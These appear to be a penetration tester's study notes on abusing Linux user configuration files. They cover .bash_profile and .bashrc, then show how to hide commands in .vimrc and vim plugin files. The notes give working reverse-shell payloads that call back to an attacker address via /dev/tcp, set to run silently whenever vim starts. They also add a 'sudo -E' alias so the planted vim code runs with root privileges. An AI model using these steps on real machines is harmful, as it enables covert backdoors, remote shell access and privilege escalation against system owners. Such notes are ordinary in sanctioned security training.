## User Configuration files

.bash_profile - executed when logging in to the system initially. This happens when logging in to the machine itself, via a serial console or SSH.  
.bashrc - executed when a new terminal window is opened from an existing login session or when a new shell instance is started from an existing login session.  

### VIM editor

**Edit /home/user/.vimrc file to execute commands when VI(M) is started**  

ways to load code with VIM
1) Put code directly into .vimrc file (:echo "test" / :silent)
2) Place code in another file and then source it with :!source (:!source /home/user/.vimrunscript)
3) 


.vimrc file
```
:silent !source ~/.vimrunscript
```

Example .vimrunscript
```bash
#!/bin/bash
bash -i >& /dev/tcp/192.168.45.237/8888 0>&1
```

Example .vim/plugin/plugin.vim
```bash
:! bash -i >& /dev/tcp/192.168.45.237/8888 0>&1
```

##### VIM Priv escalation

**On a Debian or similar system that does not persist the user's shell environment information when moving to a sudo context, we can add an alias to the user's .bashrc file**  

We need to do this so vim keeps loading the users .vimrc and vim/plugin files.

.bashrc file
```
alias sudo="sudo -E"
```
